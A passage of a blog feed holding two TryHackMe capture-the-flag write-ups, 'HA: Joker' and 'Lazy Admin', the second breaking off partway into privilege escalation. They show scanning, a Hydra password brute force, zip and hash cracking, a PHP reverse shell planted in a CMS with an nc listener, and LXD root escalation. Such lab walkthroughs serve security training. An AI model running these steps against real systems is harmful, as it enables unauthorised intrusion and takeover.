|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Port 8080 looks out of place, and wants a password.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.183.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; 
/img                  (Status: 301) [Size: 312] [--&amp;gt; http://10.10.183.215/img/]
/css                  (Status: 301) [Size: 312] [--&amp;gt; http://10.10.183.215/css/]
/secret.txt           (Status: 200) [Size: 320]                                
/server-status        (Status: 403) [Size: 278]                                
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Only one file that pops out to us.&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;/secret.txt&lt;/code&gt; on port 80 suggest a possible user.&lt;/p&gt;
&lt;p&gt;Port 8080 gives us a login form, http-get. We can try brute-forcing it using Hydra.&lt;/p&gt;
&lt;h3 id=&#34;14-password-bruteforcing-hydra&#34;&gt;1.4. Password Bruteforcing: Hydra&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ hydra 10.10.183.215 -s 8080 -l {username} -P /usr/share/wordlists/rockyou.txt http-get
Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-03 03:13:22
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.183.215:8080/
[STATUS] 1174.00 tries/min, 1174 tries in 00:01h, 14343225 to do in 203:38h, 16 active
[8080][http-get] host: 10.10.183.215   login: {username}   password: {password}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-03 03:14:34
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, we can login on the port 8080 using these credentials.&lt;/p&gt;
&lt;h3 id=&#34;15-web-exploration-again&#34;&gt;1.5. Web Exploration (Again)&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/2Dnes6f.jpg&#34; alt=&#34;port 8080 Joomla CMS website homepage&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I did not know Joker is a Joomla fan. We check the &lt;code&gt;robots.txt&lt;/code&gt; file as usual, and we get the directory structure of Joomla.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s go to &lt;code&gt;/administrator/&lt;/code&gt;. I explore how to get the password in the next sections.
&lt;img src=&#34;https://i.imgur.com/HNr1dh0.png&#34; alt=&#34;Administrator page in Joomla&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;16-web-enumeration-again&#34;&gt;1.6. Web Enumeration (Again)&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.183.215:8080/ -U {username} -P {password} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 108 -q
/templates            (Status: 301) [Size: 325] [--&amp;gt; http://10.10.183.215:8080/templates/]
/modules              (Status: 301) [Size: 323] [--&amp;gt; http://10.10.183.215:8080/modules/]  
/bin                  (Status: 301) [Size: 319] [--&amp;gt; http://10.10.183.215:8080/bin/]      
/plugins              (Status: 301) [Size: 323] [--&amp;gt; http://10.10.183.215:8080/plugins/]  
/README               (Status: 200) [Size: 4494]                                          
/README.txt           (Status: 200) [Size: 4494]                                          
/cache                (Status: 301) [Size: 321] [--&amp;gt; http://10.10.183.215:8080/cache/]    
/components           (Status: 301) [Size: 326] [--&amp;gt; http://10.10.183.215:8080/components/]
/robots               (Status: 200) [Size: 836]                                            
/robots.txt           (Status: 200) [Size: 836]                                            
/LICENSE.txt          (Status: 200) [Size: 18092]                                          
/LICENSE              (Status: 200) [Size: 18092]                                          
/administrator        (Status: 301) [Size: 329] [--&amp;gt; http://10.10.183.215:8080/administrator/]
/configuration.php    (Status: 200) [Size: 0] 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing that we don&amp;rsquo;t know. How about &lt;code&gt;nikto&lt;/code&gt; to find more interesting things?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nikto -h http://10.10.173.69:8080/ -id {username}:{password}
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.173.69
+ Target Hostname:    10.10.173.69
+ Target Port:        8080
+ Start Time:         2021-06-03 03:49:05 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm &#39; Please enter the password.&#39;
+ Successfully authenticated to realm &#39; Please enter the password.&#39; with user-supplied credentials.
+ Entry &#39;/administrator/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/bin/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/cache/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/cli/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/components/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/includes/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/language/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/layouts/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/libraries/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/modules/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/plugins/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry &#39;/tmp/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ &amp;quot;robots.txt&amp;quot; contains 14 entries which should be manually viewed.
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ /backup.zip: Potentially interesting archive/cert file found.
+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Uncommon header &#39;tcn&#39; found, with contents: choice
+ OSVDB-3092: /web.config: ASP config file is accessible.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ooh! &lt;code&gt;backup.zip&lt;/code&gt; looks interesting. Let&amp;rsquo;s explore it deeper.&lt;/p&gt;
&lt;h3 id=&#34;17-zip-cracking&#34;&gt;1.7. Zip Cracking&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] db/cmsdb.sql password: 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing is obvious as to what could be the password. I&amp;rsquo;ll use john.&lt;/p&gt;
&lt;p&gt;Wait how?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Using &lt;code&gt;zip2john&lt;/code&gt;, we can get the hash: &lt;code&gt;zip2john backup.zip &amp;gt; hash &lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Then, do &lt;code&gt;john hash&lt;/code&gt; and there you go!&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;18-logging-in&#34;&gt;1.8. Logging In&lt;/h3&gt;
&lt;p&gt;Recall we saw &lt;code&gt;db/cmsdb.sql&lt;/code&gt; file above. In it, I found:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;LOCK TABLES `cc1gr_users` WRITE;
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,&#39;Super Duper User&#39;,&#39;admin&#39;,&#39;admin@example.com&#39;,{hash was here, but it passed away :( },0,1,&#39;2019-10-08 12:00:15&#39;,&#39;2019-10-25 15:20:02&#39;,&#39;0&#39;,&#39;{\&amp;quot;admin_style\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;admin_language\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;language\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;editor\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;helpsite\&amp;quot;:\&amp;quot;\&amp;quot;,\&amp;quot;timezone\&amp;quot;:\&amp;quot;\&amp;quot;}&#39;,&#39;0000-00-00 00:00:00&#39;,0,&#39;&#39;,&#39;&#39;,0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
UNLOCK TABLES;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Again, we use &lt;code&gt;john&lt;/code&gt; to crack.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Tlv0LBQ.png&#34; alt=&#34;Control Panel for Joomla CMS&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/lmsDNof.png&#34; alt=&#34;error.php page in Joomla page&#34;  /&gt;
&lt;code&gt;error.php&lt;/code&gt; Didnt work as it does in WordPress. So, I put the reverse shell in &lt;code&gt;index.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I used &lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Reverse Shell Generator&lt;/a&gt; to get the PHP reverse shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/files]
└─$ nc -lnvp 443  
listening on [any] 443 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.173.69] 51608
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:02:25 up 16 min,  0 users,  load average: 0.00, 0.09, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
sh: 0: can&#39;t access tty; job control turned off
$ whoami
www-data

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.hackingarticles.in/lxd-privilege-escalation/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;This article&lt;/a&gt; is &lt;strong&gt;very&lt;/strong&gt; interesting and detailed, listing each and every stage of the epxloit.&lt;/p&gt;
&lt;p&gt;After getting the alpine file in the system using python http server, we do the following.
(If you are stuck in the python3 server setup, feel free to lookup other of my writeups.)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210603_0407.tar.gz  --alias myimage
&amp;lt;-v3.13-x86_64-20210603_0407.tar.gz  --alias myimage
www-data@ubuntu:/tmp$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 1e7c4197270d | no     | alpine v3.13 (20210603_04:07) | x86_64 | 3.10MB | Jun 3, 2021 at 8:11am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
www-data@ubuntu:/tmp$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Continuing the exploit further,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/mnt/root/root # ^[[31;18Rcat {file name}.{extension}
cat final.txt

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;4-room-specific-questions&#34;&gt;4. Room Specific Questions&lt;/h2&gt;
&lt;h4 id=&#34;what-version-of-apache-is-it&#34;&gt;What version of Apache is it?&lt;/h4&gt;
&lt;p&gt;Check the nmap scan results above in section 1.&lt;/p&gt;
&lt;h4 id=&#34;what-port-on-this-machine-not-need-to-be-authenticated-by-user-and-password&#34;&gt;What port on this machine not need to be authenticated by user and password?&lt;/h4&gt;
&lt;p&gt;8080 asks for password, the other does not.&lt;/p&gt;
&lt;h4 id=&#34;there-is-a-file-on-this-port-that-seems-to-be-secret-what-is-it&#34;&gt;There is a file on this port that seems to be secret, what is it?&lt;/h4&gt;
&lt;p&gt;Check the results of the web enumeration scan in section 1.&lt;/p&gt;
&lt;h4 id=&#34;when-reading-the-secret-file-we-find-with-a-conversation-that-seems-contains-at-least-two-users-and-some-keywords-that-can-be-intersting-what-user-do-you-think-it-is&#34;&gt;When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?&lt;/h4&gt;
&lt;p&gt;The name of this room is based upon?&lt;/p&gt;
&lt;h4 id=&#34;what-port-on-this-machine-need-to-be-authenticated-by-basic-authentication-mechanism&#34;&gt;What port on this machine need to be authenticated by Basic Authentication Mechanism?&lt;/h4&gt;
&lt;p&gt;Nmap scan results show another port besides 80.&lt;/p&gt;
&lt;h4 id=&#34;at-this-point-we-have-one-user-and-a-url-that-needs-to-be-aunthenticated-brute-force-it-to-get-the-password-what-is-that-password&#34;&gt;At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?&lt;/h4&gt;
&lt;p&gt;Crack the password using hydra!&lt;/p&gt;
&lt;h4 id=&#34;yeah-we-got-the-user-and-password-and-we-see-a-cms-based-blog-now-check-for-directories-and-files-in-this-port-what-directory-looks-like-as-admin-directory&#34;&gt;Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?&lt;/h4&gt;
&lt;p&gt;Check the gobuster scan results.&lt;/p&gt;
&lt;h4 id=&#34;we-need-access-to-the-administration-of-the-site-in-order-to-get-a-shell-there-is-a-backup-file-what-is-this-file&#34;&gt;We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?&lt;/h4&gt;
&lt;p&gt;Nikto scan results&lt;/p&gt;
&lt;h4 id=&#34;we-have-the-backup-file-and-now-we-should-look-for-some-information-for-example-database-configuration-files-etc--but-the-backup-file-seems-to-be-encrypted-what-is-the-password&#34;&gt;We have the backup file and now we should look for some information, for example database, configuration files, etc &amp;hellip; But the backup file seems to be encrypted. What is the password?&lt;/h4&gt;
&lt;p&gt;zip2john + john&lt;/p&gt;
&lt;h4 id=&#34;remember-that-we-need-access-to-the-administration-of-the-site-blah-blah-blah-in-our-new-discovery-we-see-some-files-that-have-compromising-information-maybe-db-ok-what-if-we-do-a-restoration-of-the-database-some-tables-must-have-something-like-user_table-what-is-the-super-duper-user&#34;&gt;Remember that&amp;hellip; We need access to the administration of the site&amp;hellip; Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?&lt;/h4&gt;
&lt;p&gt;Check the SQL file dump&lt;/p&gt;
&lt;h4 id=&#34;super-duper-user-what-is-the-password&#34;&gt;Super Duper User! What is the password?&lt;/h4&gt;
&lt;p&gt;Check the SQL file dump + john (again)&lt;/p&gt;
&lt;h4 id=&#34;at-this-point-you-should-be-upload-a-reverse-shell-in-order-to-gain-shell-access-what-is-the-owner-of-this-session&#34;&gt;At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?&lt;/h4&gt;
&lt;p&gt;Check the user in the code snippets pasted in Section 2. Foothold :)&lt;/p&gt;
&lt;h4 id=&#34;this-user-belongs-to-a-group-that-differs-on-your-own-group-what-is-this-group&#34;&gt;This user belongs to a group that differs on your own group, What is this group?&lt;/h4&gt;
&lt;p&gt;Check the &lt;code&gt;id&lt;/code&gt; command once you are in the system.&lt;/p&gt;
&lt;h4 id=&#34;spawn-a-tty-shell&#34;&gt;Spawn a tty shell.&lt;/h4&gt;
&lt;p&gt;Easiest way is &lt;code&gt;bash -i&lt;/code&gt;, but python3 shells work better for me. Use &lt;code&gt;python3 -c &#39;import pty; pty. spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt; to get a TTY shell.&lt;/p&gt;
&lt;h4 id=&#34;in-this-question-you-should-be-do-a-basic-research-on-how-linux-containers-lxd-work-it-has-a-small-online-tutorial-googling-lxd-try-it-online&#34;&gt;In this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling &amp;ldquo;lxd try it online&amp;rdquo;.&lt;/h4&gt;
&lt;p&gt;We use &lt;a class=&#34;link&#34; href=&#34;https://www.hackingarticles.in/lxd-privilege-escalation/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;this link&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id=&#34;research-how-to-escalate-privileges-using-lxd-permissions-and-check-to-see-if-there-are-any-images-available-on-the-box&#34;&gt;Research how to escalate privileges using LXD permissions and check to see if there are any images available on the box.&lt;/h4&gt;
&lt;p&gt;The link above does the job.&lt;/p&gt;
&lt;h4 id=&#34;the-idea-here-is-to-mount-the-root-of-the-os-file-system-on-the-container-this-should-give-us-access-to-the-root-directory-create-the-container-with-the-privilege-true-and-mount-the-root-file-system-on-mnt-in-order-to-gain-access-to-root-directory-on-host-machine&#34;&gt;The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory. Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.&lt;/h4&gt;
&lt;p&gt;Check the steps done above in section 3. PrivEsc&lt;/p&gt;
&lt;h4 id=&#34;what-is-the-name-of-the-file-in-the-root-directory&#34;&gt;What is the name of the file in the /root directory?&lt;/h4&gt;
&lt;p&gt;:)&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Lazy Admin Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-lazy-admin-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-lazy-admin-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/3B6uSkg.jpg" alt="Featured image of post TryHackMe: Lazy Admin Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/lazyadmin&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-enumeration--exploration&#34;&gt;1. Enumeration + Exploration&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.249.26
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 02:40 EDT
Nmap scan report for 10.10.249.26
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.08 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Noting too out of the blue here. Let&amp;rsquo;s go to the gobsuter scans for Web Enumeration.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.249.26 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/content              (Status: 301) [Size: 314] [--&amp;gt; http://10.10.249.26/content/]

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ah. Going to that page, we see the below.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Y3JQljF.png&#34; alt=&#34;Content page, SweetRice CMS&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s enumerate the &lt;code&gt;/content/&lt;/code&gt; directory in parallel.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.249.26/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q

/images               (Status: 301) [Size: 321] [--&amp;gt; http://10.10.249.26/content/images/]
/js                   (Status: 301) [Size: 317] [--&amp;gt; http://10.10.249.26/content/js/]    
/inc                  (Status: 301) [Size: 318] [--&amp;gt; http://10.10.249.26/content/inc/]   
/as                   (Status: 301) [Size: 317] [--&amp;gt; http://10.10.249.26/content/as/]    
/_themes              (Status: 301) [Size: 322] [--&amp;gt; http://10.10.249.26/content/_themes/]
/attachment           (Status: 301) [Size: 325] [--&amp;gt; http://10.10.249.26/content/attachment/]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This gives us a lot to explore.&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;We see the version of the sowftware being used.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/tI4jMIH.png&#34; alt=&#34;SweetRice CMS version&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We also see some backup files as below.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/H8DcAho.png&#34; alt=&#34;MySQL backup directory&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat mysql_bakup_20191129023059-1.5.1.sql 
&amp;lt;?php return array (
  0 =&amp;gt; &#39;DROP TABLE IF EXISTS `%--%_attachment`;&#39;,
  1 =&amp;gt; &#39;CREATE TABLE `%--%_attachment` (

{some more info}

) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;&#39;,
  14 =&amp;gt; &#39;INSERT INTO `%--%_options` VALUES( {...} &amp;quot;admin\\&amp;quot;;s:7:\\&amp;quot;manager\\&amp;quot;;s:6:\\&amp;quot;passwd\\&amp;quot;;s:32:\\&amp;quot;42f749ade7f9e195bf475f37a44c****\\
  
  {some more information here}
  
  KEY `date` (`date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;&#39;,
);?&amp;gt;   
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;14-hash-cracking&#34;&gt;1.4. Hash Cracking&lt;/h3&gt;
&lt;p&gt;We get the hash, and we can now use an online tool like CrackStation&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/PR00S0g.png&#34; alt=&#34;Hash cracking using CrackStation&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;42f749ade7f9e195bf475f37a44****: ***********&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And voila! We have the creds. The username is also mentioned closely ;)&lt;/p&gt;
&lt;p&gt;Now what?&lt;/p&gt;
&lt;h3 id=&#34;15-more-web-exploration&#34;&gt;1.5. More Web Exploration&lt;/h3&gt;
&lt;p&gt;There&amp;rsquo;s one link that we missed out on before.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s go to: &lt;code&gt;/content/as/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/KhaWHVq.png&#34; alt=&#34;Login page for admin&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Using the credentials as found before, we are in!&lt;/p&gt;
&lt;h3 id=&#34;16-admin-page&#34;&gt;1.6. Admin Page&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/QDWO8I3.png&#34; alt=&#34;Admin page of SweetRice&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ebre2uF.png&#34; alt=&#34;Details and Settings of SweetRice&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I also found more credentials lying around. These may become important later on.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/fR3h7hE.png&#34; alt=&#34;Important Database Credentials&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Since we have the version and the credentials in hand, I found one epxloit which looks pretty tasty.&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/40716&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SweetRice 1.5.1 - Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now, we attempt the foothold.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;We enter the initial creds found, which we used for logging in.&lt;/p&gt;
&lt;p&gt;Also, use &lt;a class=&#34;link&#34; href=&#34;https://revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;RevShells&lt;/a&gt; to get the &lt;code&gt;PHP PentestMonkey&lt;/code&gt; shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/F0Jryka.png&#34; alt=&#34;SweetRice Exploit&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;NOTE: &lt;code&gt;.php&lt;/code&gt; did not work. It does not show in the uploads. Renaming it to &lt;code&gt;.php5&lt;/code&gt; worked.&lt;/p&gt;
&lt;p&gt;Also, start up netcat on the selected port, and go to the url given.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/VIJcmtD.png&#34; alt=&#34;SweetRice Exploit Working&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/SUECOzF.png&#34; alt=&#34;Getting a shell with the exploit&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;*in deep hacker voice* I am in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;We so a bit of exploration and we get some more creds. These are the same as what we saw before.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@THM-Chal:/home/itguy$ cat mysql_login.txt
cat mysql_login.txt
rice:**********
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Check sudo permissions.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@THM-Chal:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

